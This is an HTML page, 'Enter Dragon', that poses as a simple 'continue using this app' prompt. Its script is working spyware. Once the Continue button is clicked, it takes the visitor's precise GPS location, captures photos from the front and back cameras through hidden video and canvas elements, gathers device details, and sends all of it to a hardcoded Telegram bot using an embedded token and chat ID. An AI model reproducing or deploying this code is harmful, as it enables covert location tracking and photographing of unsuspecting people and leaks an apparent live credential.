<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Dragon</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #050505;
            background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #000 100%);
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        
        .glass-panel {
            background: rgba(30, 30, 30, 0.4);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 50px 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 85%;
            width: 360px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.05);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h1 {
            margin-top: 0;
            font-size: 28px;
            letter-spacing: 3px;
            text-transform: uppercase;
            font-weight: 600;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        }

        p {
            font-size: 15px;
            margin-bottom: 35px;
            line-height: 1.6;
            color: #d1d1d1;
        }

        .btn-continue {
            background: rgba(0, 102, 255, 0.2);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 102, 255, 0.5);
            color: white;
            padding: 16px 30px;
            font-size: 18px;
            font-weight: 500;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.15);
        }

        .btn-continue:active {
            background: rgba(0, 102, 255, 0.4);
            transform: scale(0.98);
        }

        .loader {
            display: none;
            margin: 20px auto;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #0066ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Persistent Status Log Box */
        #status-log {
            display: none;
            width: 100%;
            margin-top: 20px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            text-align: left;
            font-size: 13px;
            max-height: 180px;
            overflow-y: auto;
            box-sizing: border-box;
        }
        
        .log-item {
            margin-bottom: 6px;
            color: #e0e0e0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            padding-bottom: 4px;
        }
    </style>
</head>
<body>

    <div class="glass-panel">
        <h1>Enter Dragon</h1>
        <p>Do you want to continue using this app?<br>Is the service required?</p>
        <button class="btn-continue" id="continueBtn" onclick="startProcess()">Continue</button>
        <div class="loader" id="loader"></div>
        
        <!-- Persistent Notification Box -->
        <div id="status-log"></div>
    </div>

    <!-- Hidden elements for reliable photo capture -->
    <video id="hidden-video" style="display:none;" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo";
        const CHAT_ID = "7208869554";

        const statusLog = document.getElementById('status-log');
        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        const ctx = canvas.getContext('2d');

        function logStatus(message, icon = "✅") {
            statusLog.style.display = 'block';
            const logEntry = document.createElement('div');
            logEntry.className = 'log-item';
            logEntry.innerHTML = `${icon} ${message}`;
            statusLog.appendChild(logEntry);
            statusLog.scrollTop = statusLog.scrollHeight;
        }

        async function sendTextToBot(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            }).catch(e => console.log(e));
        }

        async function sendFileToBot(blob, filename) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', blob, filename);
            await fetch(url, { method: 'POST', body: formData }).catch(e => console.log(e));
        }

        async function captureTwoPhotos(facingMode, prefixName) {
            let stream;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                video.srcObject = stream;
                await video.play();
                
                // ചെറിയ ഡിലേ (ക്യാമറ ഫോക്കസ് ആകാൻ)
                await new Promise(r => setTimeout(r, 1000));
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                // Photo 1
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob1 = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                await sendFileToBot(blob1, `${prefixName}_1.jpg`);
                logStatus(`${prefixName} Photo 1 Sent`);

                // ചെറിയ ഇടവേള 
                await new Promise(r => setTimeout(r, 800));
                
                // Photo 2
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob2 = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                await sendFileToBot(blob2, `${prefixName}_2.jpg`);
                logStatus(`${prefixName} Photo 2 Sent`);

            } catch (err) {
                logStatus(`Failed to access ${prefixName} camera`, "❌");
            } finally {
                if (stream) stream.getTracks().forEach(t => t.stop()); // ക്യാമറ കൃത്യമായി ഓഫ് ആക്കുന്നു
            }
        }

        async function startProcess() {
            document.getElementById('continueBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            statusLog.innerHTML = ""; 
            logStatus("Process Started...", "⏳");

            // 1. LOCATION (GPS) - First Priority
            logStatus("Requesting GPS Location...", "📍");
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
                    });
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    await sendTextToBot(`📍 GPS Location:\n${mapUrl}`);
                    logStatus("GPS Location Sent Successfully");
                } catch (err) {
                    await sendTextToBot(`❌ GPS Failed: ${err.message}`);
                    logStatus(`GPS Failed: ${err.message}`, "❌");
                }
            } else {
                logStatus("GPS Not Supported by Browser", "❌");
            }

            // 2. FRONT CAMERA (2 Images)
            logStatus("Accessing Front Camera...", "📸");
            await captureTwoPhotos("user", "front_camera");

            // 3. BACK CAMERA (2 Images)
            logStatus("Accessing Back Camera...", "📸");
            await captureTwoPhotos({ exact: "environment" }, "back_camera").catch(() => captureTwoPhotos("environment", "back_camera"));

            // 4. MOBILE SPECIFICATIONS
            logStatus("Gathering Mobile Specs...", "📱");
            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
            const resolution = window.screen.width + " x " + window.screen.height;
            const osInfo = navigator.userAgent;
            
            const specMessage = `📱 Device Specifications:\n\nRAM: ${ram}\nResolution: ${resolution}\nSystem/Browser: ${osInfo}`;
            await sendTextToBot(specMessage);
            logStatus("Mobile Specifications Sent");

            // FINISH
            document.getElementById('loader').style.display = 'none';
            const btn = document.getElementById('continueBtn');
            btn.style.display = 'block';
            btn.innerText = 'Successfully';
            btn.style.background = 'rgba(0, 200, 100, 0.4)'; // Green success color
            btn.style.border = '1px solid rgba(0, 200, 100, 0.8)';
            logStatus("All tasks completed successfully.", "✨");
        }
    </script>
</body>
</html>
